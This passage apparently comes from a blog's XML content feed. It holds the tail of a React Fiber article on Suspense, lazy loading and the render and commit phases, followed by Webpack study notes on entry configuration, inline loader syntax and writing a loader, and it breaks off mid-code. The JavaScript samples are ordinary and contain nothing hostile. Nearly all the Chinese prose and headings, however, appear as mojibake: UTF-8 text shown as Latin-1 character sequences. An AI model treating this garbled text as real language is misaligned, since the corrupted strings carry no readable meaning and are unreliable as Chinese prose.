è¿”å›ä¸€ä¸ªç‰¹æ®Šå¯¹è±¡ï¼ˆLazyComponentï¼‰ï¼ŒåŒ…å« <code>_status</code>ï¼ˆ<code>Pending/Resolved/Rejected</code>ï¼‰å’Œ <code>_result</code>ï¼ˆåŠ è½½çš„æ¨¡å—ï¼‰ã€‚</li><li>é¦–æ¬¡æ¸²æŸ“æ—¶ï¼ŒreadLazyComponentType æ£€æŸ¥çŠ¶æ€ï¼š<ul><li>è‹¥ Pendingï¼ŒæŠ›å‡º thenableï¼ˆPromiseï¼‰ï¼Œè§¦å‘ Suspense æ˜¾ç¤º fallbackã€‚</li><li>è‹¥ Resolvedï¼Œè¿”å›æ¨¡å—å¹¶æ¸²æŸ“</li></ul></li></ul><p>ï¼ˆ2ï¼‰æ•°æ®è·å–ï¼ˆAsync Data Fetchingï¼‰<br>å®éªŒæ€§ API <code>unstable_createResource</code> å…è®¸åœ¨ç»„ä»¶å†…åŒæ­¥è¯»å–å¼‚æ­¥æ•°æ®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> resource = <span class="hljs-title function_">unstable_createResource</span>(fetchData);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = resource.<span class="hljs-title function_">read</span>(id); <span class="hljs-comment">// å¯èƒ½æŠ›å‡º Promise</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>resource.read æ£€æŸ¥ç¼“å­˜ï¼š<ul><li>è‹¥æ•°æ®æœªåŠ è½½ï¼ŒæŠ›å‡º Promiseï¼ŒSuspense æ•è·å¹¶æ˜¾ç¤º fallbackã€‚</li><li>è‹¥æ•°æ®å·²åŠ è½½ï¼Œç›´æ¥è¿”å›6ã€‚</li></ul></li><li>React åœ¨å¾®ä»»åŠ¡é˜¶æ®µé‡æ–°å°è¯•æ¸²æŸ“å®ŒæˆåŠ è½½çš„ç»„ä»¶</li></ul><h2 id="4-3-å®é™…æ¡ˆä¾‹ï¼šstartTransitionçš„å·¥ä½œåŸç†"><a href="#4-3-å®é™…æ¡ˆä¾‹ï¼šstartTransitionçš„å·¥ä½œåŸç†" class="headerlink" title="4.3 å®é™…æ¡ˆä¾‹ï¼šstartTransitionçš„å·¥ä½œåŸç†"></a>4.3 å®é™…æ¡ˆä¾‹ï¼šstartTransitionçš„å·¥ä½œåŸç†</h2><h1 id="ç¬¬äº”ç« ï¼šFiberçš„æ¸²æŸ“æµç¨‹å‰–æ"><a href="#ç¬¬äº”ç« ï¼šFiberçš„æ¸²æŸ“æµç¨‹å‰–æ" class="headerlink" title="ç¬¬äº”ç« ï¼šFiberçš„æ¸²æŸ“æµç¨‹å‰–æ"></a>ç¬¬äº”ç« ï¼šFiberçš„æ¸²æŸ“æµç¨‹å‰–æ</h1><h2 id="5-1-ä¸¤é˜¶æ®µæäº¤æ¨¡å‹è¯¦è§£"><a href="#5-1-ä¸¤é˜¶æ®µæäº¤æ¨¡å‹è¯¦è§£" class="headerlink" title="5.1 ä¸¤é˜¶æ®µæäº¤æ¨¡å‹è¯¦è§£"></a>5.1 ä¸¤é˜¶æ®µæäº¤æ¨¡å‹è¯¦è§£</h2><h3 id="Renderé˜¶æ®µï¼ˆå¯ä¸­æ–­ï¼‰ï¼šReconciliationä¸Effectæ”¶é›†"><a href="#Renderé˜¶æ®µï¼ˆå¯ä¸­æ–­ï¼‰ï¼šReconciliationä¸Effectæ”¶é›†" class="headerlink" title="Renderé˜¶æ®µï¼ˆå¯ä¸­æ–­ï¼‰ï¼šReconciliationä¸Effectæ”¶é›†"></a>Renderé˜¶æ®µï¼ˆå¯ä¸­æ–­ï¼‰ï¼šReconciliationä¸Effectæ”¶é›†</h3><h3 id="Commité˜¶æ®µï¼ˆä¸å¯ä¸­æ–­ï¼‰ï¼šDOMæ›´æ–°ä¸ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œ"><a href="#Commité˜¶æ®µï¼ˆä¸å¯ä¸­æ–­ï¼‰ï¼šDOMæ›´æ–°ä¸ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œ" class="headerlink" title="Commité˜¶æ®µï¼ˆä¸å¯ä¸­æ–­ï¼‰ï¼šDOMæ›´æ–°ä¸ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œ"></a>Commité˜¶æ®µï¼ˆä¸å¯ä¸­æ–­ï¼‰ï¼šDOMæ›´æ–°ä¸ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œ</h3><h2 id="5-2-åŒç¼“å­˜æ ‘åˆ‡æ¢çš„å®Œæ•´æµç¨‹"><a href="#5-2-åŒç¼“å­˜æ ‘åˆ‡æ¢çš„å®Œæ•´æµç¨‹" class="headerlink" title="5.2 åŒç¼“å­˜æ ‘åˆ‡æ¢çš„å®Œæ•´æµç¨‹"></a>5.2 åŒç¼“å­˜æ ‘åˆ‡æ¢çš„å®Œæ•´æµç¨‹</h2><h3 id="ä»WorkInProgressæ ‘åˆ°Currentæ ‘çš„åˆ‡æ¢æ—¶æœº"><a href="#ä»WorkInProgressæ ‘åˆ°Currentæ ‘çš„åˆ‡æ¢æ—¶æœº" class="headerlink" title="ä»WorkInProgressæ ‘åˆ°Currentæ ‘çš„åˆ‡æ¢æ—¶æœº"></a>ä»WorkInProgressæ ‘åˆ°Currentæ ‘çš„åˆ‡æ¢æ—¶æœº</h3><h3 id="é”™è¯¯è¾¹ç•Œä¸æ¸²æŸ“æ¢å¤æœºåˆ¶"><a href="#é”™è¯¯è¾¹ç•Œä¸æ¸²æŸ“æ¢å¤æœºåˆ¶" class="headerlink" title="é”™è¯¯è¾¹ç•Œä¸æ¸²æŸ“æ¢å¤æœºåˆ¶"></a>é”™è¯¯è¾¹ç•Œä¸æ¸²æŸ“æ¢å¤æœºåˆ¶</h3><h1 id="ç¬¬å…­ç« ï¼šFiberçš„æ€§èƒ½ä¼˜åŒ–å®è·µ"><a href="#ç¬¬å…­ç« ï¼šFiberçš„æ€§èƒ½ä¼˜åŒ–å®è·µ" class="headerlink" title="ç¬¬å…­ç« ï¼šFiberçš„æ€§èƒ½ä¼˜åŒ–å®è·µ"></a>ç¬¬å…­ç« ï¼šFiberçš„æ€§èƒ½ä¼˜åŒ–å®è·µ</h1><h2 id="6-1-å‡å°‘åè°ƒå¼€é”€çš„ä¼˜åŒ–ç­–ç•¥"><a href="#6-1-å‡å°‘åè°ƒå¼€é”€çš„ä¼˜åŒ–ç­–ç•¥" class="headerlink" title="6.1 å‡å°‘åè°ƒå¼€é”€çš„ä¼˜åŒ–ç­–ç•¥"></a>6.1 å‡å°‘åè°ƒå¼€é”€çš„ä¼˜åŒ–ç­–ç•¥</h2><h3 id="React-memoã€useMemoã€useCallbackçš„åŸç†ä¸è¯¯ç”¨"><a href="#React-memoã€useMemoã€useCallbackçš„åŸç†ä¸è¯¯ç”¨" class="headerlink" title="React.memoã€useMemoã€useCallbackçš„åŸç†ä¸è¯¯ç”¨"></a>React.memoã€useMemoã€useCallbackçš„åŸç†ä¸è¯¯ç”¨</h3><h3 id="ä¸å¯å˜æ•°æ®ä¸SCUï¼ˆshouldComponentUpdateï¼‰ä¼˜åŒ–"><a href="#ä¸å¯å˜æ•°æ®ä¸SCUï¼ˆshouldComponentUpdateï¼‰ä¼˜åŒ–" class="headerlink" title="ä¸å¯å˜æ•°æ®ä¸SCUï¼ˆshouldComponentUpdateï¼‰ä¼˜åŒ–"></a>ä¸å¯å˜æ•°æ®ä¸SCUï¼ˆshouldComponentUpdateï¼‰ä¼˜åŒ–</h3><h2 id="6-2-è°ƒè¯•å·¥å…·ä¸æ€§èƒ½åˆ†æ"><a href="#6-2-è°ƒè¯•å·¥å…·ä¸æ€§èƒ½åˆ†æ" class="headerlink" title="6.2 è°ƒè¯•å·¥å…·ä¸æ€§èƒ½åˆ†æ"></a>6.2 è°ƒè¯•å·¥å…·ä¸æ€§èƒ½åˆ†æ</h2><h3 id="React-DevToolsçš„Fiberæ ‘-inspection"><a href="#React-DevToolsçš„Fiberæ ‘-inspection" class="headerlink" title="React DevToolsçš„Fiberæ ‘ inspection"></a>React DevToolsçš„Fiberæ ‘ inspection</h3><h3 id="ä½¿ç”¨Profiler-APIå®šä½æ¸²æŸ“ç“¶é¢ˆ"><a href="#ä½¿ç”¨Profiler-APIå®šä½æ¸²æŸ“ç“¶é¢ˆ" class="headerlink" title="ä½¿ç”¨Profiler APIå®šä½æ¸²æŸ“ç“¶é¢ˆ"></a>ä½¿ç”¨Profiler APIå®šä½æ¸²æŸ“ç“¶é¢ˆ</h3><h1 id="ç¬¬ä¸ƒç« ï¼šFiberçš„å»¶ä¼¸ä¸ç”Ÿæ€ç³»ç»Ÿå½±å“"><a href="#ç¬¬ä¸ƒç« ï¼šFiberçš„å»¶ä¼¸ä¸ç”Ÿæ€ç³»ç»Ÿå½±å“" class="headerlink" title="ç¬¬ä¸ƒç« ï¼šFiberçš„å»¶ä¼¸ä¸ç”Ÿæ€ç³»ç»Ÿå½±å“"></a>ç¬¬ä¸ƒç« ï¼šFiberçš„å»¶ä¼¸ä¸ç”Ÿæ€ç³»ç»Ÿå½±å“</h1><h2 id="7-1-Fiberæ¶æ„çš„é€šç”¨æ€§è®¾è®¡"><a href="#7-1-Fiberæ¶æ„çš„é€šç”¨æ€§è®¾è®¡" class="headerlink" title="7.1 Fiberæ¶æ„çš„é€šç”¨æ€§è®¾è®¡"></a>7.1 Fiberæ¶æ„çš„é€šç”¨æ€§è®¾è®¡</h2><h3 id="è‡ªå®šä¹‰æ¸²æŸ“å™¨ï¼ˆå¦‚React-Three-Fiberï¼‰çš„å®ç°åŸç†"><a href="#è‡ªå®šä¹‰æ¸²æŸ“å™¨ï¼ˆå¦‚React-Three-Fiberï¼‰çš„å®ç°åŸç†" class="headerlink" title="è‡ªå®šä¹‰æ¸²æŸ“å™¨ï¼ˆå¦‚React Three Fiberï¼‰çš„å®ç°åŸç†"></a>è‡ªå®šä¹‰æ¸²æŸ“å™¨ï¼ˆå¦‚React Three Fiberï¼‰çš„å®ç°åŸç†</h3><h3 id="éDOMç¯å¢ƒï¼ˆReact-Nativeï¼‰çš„Fiberé€‚é…"><a href="#éDOMç¯å¢ƒï¼ˆReact-Nativeï¼‰çš„Fiberé€‚é…" class="headerlink" title="éDOMç¯å¢ƒï¼ˆReact Nativeï¼‰çš„Fiberé€‚é…"></a>éDOMç¯å¢ƒï¼ˆReact Nativeï¼‰çš„Fiberé€‚é…</h3><h2 id="7-2-å…¶ä»–æ¡†æ¶çš„å€Ÿé‰´ä¸å¯¹æ¯”"><a href="#7-2-å…¶ä»–æ¡†æ¶çš„å€Ÿé‰´ä¸å¯¹æ¯”" class="headerlink" title="7.2 å…¶ä»–æ¡†æ¶çš„å€Ÿé‰´ä¸å¯¹æ¯”"></a>7.2 å…¶ä»–æ¡†æ¶çš„å€Ÿé‰´ä¸å¯¹æ¯”</h2><h3 id="Vue-3çš„è°ƒåº¦å™¨è®¾è®¡-vs-React-Fiber"><a href="#Vue-3çš„è°ƒåº¦å™¨è®¾è®¡-vs-React-Fiber" class="headerlink" title="Vue 3çš„è°ƒåº¦å™¨è®¾è®¡ vs React Fiber"></a>Vue 3çš„è°ƒåº¦å™¨è®¾è®¡ vs React Fiber</h3><h3 id="Svelteçš„ç¼–è¯‘æ—¶ä¼˜åŒ–ä¸è¿è¡Œæ—¶è°ƒåº¦çš„å–èˆ"><a href="#Svelteçš„ç¼–è¯‘æ—¶ä¼˜åŒ–ä¸è¿è¡Œæ—¶è°ƒåº¦çš„å–èˆ" class="headerlink" title="Svelteçš„ç¼–è¯‘æ—¶ä¼˜åŒ–ä¸è¿è¡Œæ—¶è°ƒåº¦çš„å–èˆ"></a>Svelteçš„ç¼–è¯‘æ—¶ä¼˜åŒ–ä¸è¿è¡Œæ—¶è°ƒåº¦çš„å–èˆ</h3><h1 id="ç¬¬å…«ç« ï¼šä»æºç è§’åº¦ç†è§£Fiber"><a href="#ç¬¬å…«ç« ï¼šä»æºç è§’åº¦ç†è§£Fiber" class="headerlink" title="ç¬¬å…«ç« ï¼šä»æºç è§’åº¦ç†è§£Fiber"></a>ç¬¬å…«ç« ï¼šä»æºç è§’åº¦ç†è§£Fiber</h1><h2 id="8-1-å…³é”®æºç æ–‡ä»¶å¯¼è¯»"><a href="#8-1-å…³é”®æºç æ–‡ä»¶å¯¼è¯»" class="headerlink" title="8.1 å…³é”®æºç æ–‡ä»¶å¯¼è¯»"></a>8.1 å…³é”®æºç æ–‡ä»¶å¯¼è¯»</h2><h3 id="react-reconcileråŒ…çš„æ ¸å¿ƒé€»è¾‘"><a href="#react-reconcileråŒ…çš„æ ¸å¿ƒé€»è¾‘" class="headerlink" title="react-reconcileråŒ…çš„æ ¸å¿ƒé€»è¾‘"></a>react-reconcileråŒ…çš„æ ¸å¿ƒé€»è¾‘</h3><h3 id="beginWorkã€completeWorkå‡½æ•°è§£æ"><a href="#beginWorkã€completeWorkå‡½æ•°è§£æ" class="headerlink" title="beginWorkã€completeWorkå‡½æ•°è§£æ"></a>beginWorkã€completeWorkå‡½æ•°è§£æ</h3><h2 id="8-2-æ‰‹å†™è¿·ä½ Fiberå¼•æ“"><a href="#8-2-æ‰‹å†™è¿·ä½ Fiberå¼•æ“" class="headerlink" title="8.2 æ‰‹å†™è¿·ä½ Fiberå¼•æ“"></a>8.2 æ‰‹å†™è¿·ä½ Fiberå¼•æ“</h2><h3 id="å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆFiberè°ƒåº¦å™¨ï¼ˆ300è¡Œä»£ç Demoï¼‰"><a href="#å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆFiberè°ƒåº¦å™¨ï¼ˆ300è¡Œä»£ç Demoï¼‰" class="headerlink" title="å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆFiberè°ƒåº¦å™¨ï¼ˆ300è¡Œä»£ç Demoï¼‰"></a>å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆFiberè°ƒåº¦å™¨ï¼ˆ300è¡Œä»£ç Demoï¼‰</h3>]]></content>
    
    
    <categories>
      
      <category>React</category>
      
    </categories>
    
    
    <tags>
      
      <tag>React</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Webpack å­¦ä¹ ç¬”è®°</title>
    <link href="/2025/05/29/Webpack%20Study%20Notes/"/>
    <url>/2025/05/29/Webpack%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h2 id="å…¥å£èµ·ç‚¹ï¼ˆentry-pointï¼‰"><a href="#å…¥å£èµ·ç‚¹ï¼ˆentry-pointï¼‰" class="headerlink" title="å…¥å£èµ·ç‚¹ï¼ˆentry pointï¼‰"></a>å…¥å£èµ·ç‚¹ï¼ˆentry pointï¼‰</h2><h3 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p>è¯­æ³•ï¼šentry: string | [string] | { <entryChunkName> string | [string] } | {}</p><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: &#123;<br>    <span class="hljs-attr">app</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span>,<br>    <span class="hljs-attr">file</span>: [<span class="hljs-string">&#x27;./src/file_1.js&#x27;</span>, <span class="hljs-string">&#x27;./src/file_2.js&#x27;</span>],<br>    <span class="hljs-attr">a1</span>: &#123;<br>      <span class="hljs-attr">dependOn</span>: <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-comment">// å½“å‰å…¥å£æ‰€ä¾èµ–çš„å…¥å£ã€‚å®ƒä»¬å¿…é¡»åœ¨è¯¥å…¥å£è¢«åŠ è½½å‰è¢«åŠ è½½ã€‚</span><br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// æŒ‡å®šè¦è¾“å‡ºçš„æ–‡ä»¶åç§°</span><br>      <span class="hljs-attr">import</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// å¯åŠ¨æ—¶éœ€åŠ è½½çš„æ¨¡å—</span><br>      <span class="hljs-attr">library</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// æŒ‡å®š library é€‰é¡¹ï¼Œä¸ºå½“å‰ entry æ„å»ºä¸€ä¸ª library</span><br>      <span class="hljs-attr">runtime</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// è¿è¡Œæ—¶ chunk çš„åå­—ã€‚å¦‚æœè®¾ç½®äº†ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„è¿è¡Œæ—¶ chunkã€‚åœ¨ webpack 5.43.0 ä¹‹åå¯å°†å…¶è®¾ä¸º false ä»¥é¿å…ä¸€ä¸ªæ–°çš„è¿è¡Œæ—¶ chunk</span><br>      <span class="hljs-attr">publicPath</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// å½“è¯¥å…¥å£çš„è¾“å‡ºæ–‡ä»¶åœ¨æµè§ˆå™¨ä¸­è¢«å¼•ç”¨æ—¶ï¼Œä¸ºå®ƒä»¬æŒ‡å®šä¸€ä¸ªå…¬å…± URL åœ°å€</span><br>    &#125;,<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li>runtime å’Œ dependOn ä¸åº”åœ¨åŒä¸€ä¸ªå…¥å£ä¸ŠåŒæ—¶ä½¿ç”¨</li><li>ç¡®ä¿ runtime ä¸èƒ½æŒ‡å‘å·²å­˜åœ¨çš„å…¥å£åç§°</li><li>dependOn ä¸èƒ½æ˜¯å¾ªç¯å¼•ç”¨çš„</li></ul><h3 id="ç»éªŒä¹‹è°ˆ"><a href="#ç»éªŒä¹‹è°ˆ" class="headerlink" title="ç»éªŒä¹‹è°ˆ"></a>ç»éªŒä¹‹è°ˆ</h3><ul><li>åœ¨webpack4.xåŠä»¥ä¸Šç‰ˆæœ¬ï¼Œä¸è¦ä¸º vendor æˆ–å…¶ä»–ä¸æ˜¯æ‰§è¡Œèµ·ç‚¹åˆ›å»º entryï¼Œè€Œæ˜¯ä½¿ç”¨ optimization.splitChunks é€‰é¡¹ï¼Œå°† vendor å’Œ app(åº”ç”¨ç¨‹åº) æ¨¡å—åˆ†å¼€ï¼Œå¹¶ä¸ºå…¶åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶</li><li>æ¯ä¸ª HTML æ–‡æ¡£åªä½¿ç”¨ä¸€ä¸ªå…¥å£èµ·ç‚¹</li></ul><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>loaderç”¨äºè½¬æ¢æŸäº›ç±»å‹çš„æ¨¡å—ï¼Œwebpack åªèƒ½ç†è§£ JavaScript å’Œ JSON æ–‡ä»¶ï¼Œè¿™æ˜¯ webpack å¼€ç®±å¯ç”¨çš„è‡ªå¸¦èƒ½åŠ›ã€‚loaderÂ è®© webpack èƒ½å¤Ÿå»å¤„ç†å…¶ä»–ç±»å‹çš„æ–‡ä»¶ï¼Œå¹¶å°†å®ƒä»¬è½¬æ¢ä¸ºæœ‰æ•ˆæ¨¡å—ï¼Œä»¥ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œä»¥åŠè¢«æ·»åŠ åˆ°ä¾èµ–å›¾ä¸­ã€‚</p><h3 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h3><ul><li>é…ç½®æ–¹å¼ï¼šåœ¨ webpack.config.js æ–‡ä»¶ä¸­æŒ‡å®š loader</li><li>å†…è”æ–¹å¼ï¼šåœ¨æ¯ä¸ª import è¯­å¥ä¸­æ˜¾å¼æŒ‡å®š loaderï¼Œé€šè¿‡ä¸ºå†…è” import è¯­å¥æ·»åŠ å‰ç¼€ï¼Œå¯ä»¥è¦†ç›–é…ç½®æ–‡ä»¶ä¸­çš„æ‰€æœ‰ loader, preLoader å’Œ postLoader</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼ é€’å‚æ•°ï¼ˆç±»ä¼¼ webpack é…ç½®ä¸­çš„ optionsï¼‰</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;style-loader!css-loader?modules=true!./styles.css&#x27;</span><br><br><span class="hljs-comment">// å¤šä¸ªå‚æ•°ç”¨ &amp; åˆ†éš”</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;url-loader?limit=1024&amp;name=images/[hash].[ext]!./image.png&#x27;</span><br><br><span class="hljs-comment">// ä½¿ç”¨ ! å‰ç¼€ï¼Œå°†ç¦ç”¨æ‰€æœ‰å·²é…ç½®çš„ normal loader(æ™®é€š loader)</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;!style-loader!css-loader?modules!./styles.css&#x27;</span><br><br><span class="hljs-comment">// ä½¿ç”¨ !! å‰ç¼€ï¼Œå°†ç¦ç”¨æ‰€æœ‰å·²é…ç½®çš„ loaderï¼ˆpreLoader, loader, postLoaderï¼‰</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;!!style-loader!css-loader?modules!./styles.css&#x27;</span><br><br><span class="hljs-comment">// ä½¿ç”¨ -! å‰ç¼€ï¼Œå°†ç¦ç”¨æ‰€æœ‰å·²é…ç½®çš„ preLoader å’Œ loaderï¼Œä½†æ˜¯ä¸ç¦ç”¨ postLoaders</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;-!style-loader!css-loader?modules!./styles.css&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>loaderæœ¬è´¨ä¸Šæ˜¯<strong>å¯¼å‡ºä¸ºå‡½æ•°çš„JavaScriptæ¨¡å—</strong>ï¼Œwebpackå†…éƒ¨çš„loader runnerä¼šè°ƒç”¨è¯¥å‡½æ•°ï¼Œå¹¶å°†ä¸Šä¸€ä¸ªloaderçš„è¾“å‡ºç»“æœä½œä¸ºå‚æ•°ä¼ ç»™è¯¥å‡½æ•°</li><li>loaderçš„æ‰§è¡Œé¡ºåºæ˜¯ä»å³åˆ°å·¦ï¼Œä»ä¸‹åˆ°ä¸Šï¼Œå¯ä»¥é€šè¿‡enforceé…ç½®é¡¹æˆ–loaderçš„pitchæ–¹æ³•æ”¹å˜æ‰§è¡Œé¡ºåºï¼Œ<strong>æœ€åä¸€ä¸ªloaderçš„è¾“å‡ºç»“æœåº”è¯¥ä¸ºStringæˆ–Bufferç±»å‹</strong></li><li>loaderå¯ä»¥æ˜¯åŒæ­¥çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¼‚æ­¥çš„</li><li>loaderè¿è¡Œåœ¨Node.jsä¸­</li><li>loaderå†…éƒ¨çš„thisä¸Šå¯è®¿é—®çš„å±æ€§å’Œæ–¹æ³•éƒ½é€šè¿‡loader contextä¸Šä¸‹æ–‡ç»‘å®š</li></ul><h3 id="ç¼–å†™ä¸€ä¸ªloader"><a href="#ç¼–å†™ä¸€ä¸ªloader" class="headerlink" title="ç¼–å†™ä¸€ä¸ªloader"></a>ç¼–å†™ä¸€ä¸ªloader</h3><p><strong>my-loader.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŒæ­¥loader</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, map, meta</span>) &#123;<br>  <span class="hljs-comment">// å•ä¸ªå¤„ç†ç»“æœå¯ä»¥ç›´æ¥return</span><br>  <span class="hljs-comment">// return doSomething(source)</span><br>  <span class="hljs-comment">// å¤šä¸ªå¤„ç†ç»“æœåˆ™å¿…é¡»è°ƒç”¨this.callback()</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-title function_">doSomething</span>(source), map, meta)<br>  <span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// å¼‚æ­¥loaderï¼Œå¿…é¡»è°ƒç”¨this.async()æ¥å‘ŠçŸ¥loader runnerç­‰å¾…å¼‚æ­¥è¾“å‡ºç»“æœ</span><br><span class="hljs-comment">// å®ƒä¼šè¿”å› this.callback() å›è°ƒå‡½æ•°ã€‚éšå loader å¿…é¡»è¿”å› undefined å¹¶ä¸”è°ƒç”¨è¯¥å›è°ƒå‡½æ•°</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, map, meta</span>) &#123;<br>  <span class="hljs-keyword">var</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>()<br>  <span class="hljs-title function_">doSomeAsyncthing</span>(source, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(err)<br>    &#125;<br>    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, res, map, meta)<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h2><h3 id="å®šä¹‰-1"><a href="#å®šä¹‰-1" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>webpackæ’ä»¶æ˜¯ä¸€ä¸ªå…·æœ‰ <strong>apply</strong> æ–¹æ³•çš„ JavaScript ç±»ã€‚apply æ–¹æ³•ä¼šè¢« webpack compiler è°ƒç”¨ï¼Œå¹¶ä¸”åœ¨ <strong>æ•´ä¸ª</strong> ç¼–è¯‘ç”Ÿå‘½å‘¨æœŸéƒ½å¯ä»¥è®¿é—® compiler å¯¹è±¡ï¼Œæ’ä»¶ç›®çš„åœ¨äºè§£å†³ loader æ— æ³•å®ç°çš„å…¶ä»–äº‹ï¼ŒåŒ…æ‹¬ï¼šæ‰“åŒ…ä¼˜åŒ–ï¼Œèµ„æºç®¡ç†ï¼Œæ³¨å…¥ç¯å¢ƒå˜é‡ã€‚</p><h3 id="ä½¿ç”¨æ–¹å¼-1"><a href="#ä½¿ç”¨æ–¹å¼-1" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h3><ul><li>é…ç½®æ–¹å¼ï¼šåœ¨webpack.config.jsæ–‡ä»¶ä¸­ï¼Œå‘ plugins å±æ€§ä¼ å…¥ä¸€ä¸ª new å®ä¾‹</li><li>Node APIæ–¹å¼ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>) <span class="hljs-comment">// è®¿é—® webpack è¿è¡Œæ—¶(runtime)</span><br><span class="hljs-keyword">const</span> configuration = <span class="hljs-built_in">require</span>(<span 